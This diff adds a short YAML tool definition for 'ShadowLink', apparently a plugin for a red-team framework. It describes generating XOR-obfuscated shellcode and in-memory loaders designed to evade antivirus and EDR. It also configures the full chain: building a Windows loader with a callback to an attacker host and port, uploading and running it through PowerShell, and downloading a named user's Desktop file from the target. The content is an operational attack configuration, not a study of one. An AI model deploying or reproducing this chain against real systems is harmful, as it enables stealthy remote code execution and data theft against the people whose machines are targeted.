@@ -1,0 +1,24 @@
+name: ShadowLink
+description: >
+  ShadowLink is a next-generation, automated framework for generating, obfuscating, and delivering shellcode through in-memory loaders. Designed for red team operations, penetration testing, and offensive research, ShadowLink empowers attackers to deploy stealthy, fileless payloads that execute directly in memory — bypassing traditional AV/EDR detection mechanisms.
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+  - name: lport
+    type: string
+    required: true
+    description: lport to operate.
+tool:
+  name: ShadowLink
+  repo_url: https://github.com/grisuno/ShadowLink.git
+  install_path: external/.exploit/ShadowLink
+  install_command: make windows
+  execute_command: chmod +x *.sh && ./main.sh windows {lhost} {lport} xor 0x55
+  upload_file: no_priv ./external/.exploit/ShadowLink/loader_windows.exe
+  remote_command: no_priv powershell .\loader_windows.exe
+  download_file: C:\Users\nathan.aadam\Desktop\user.txt
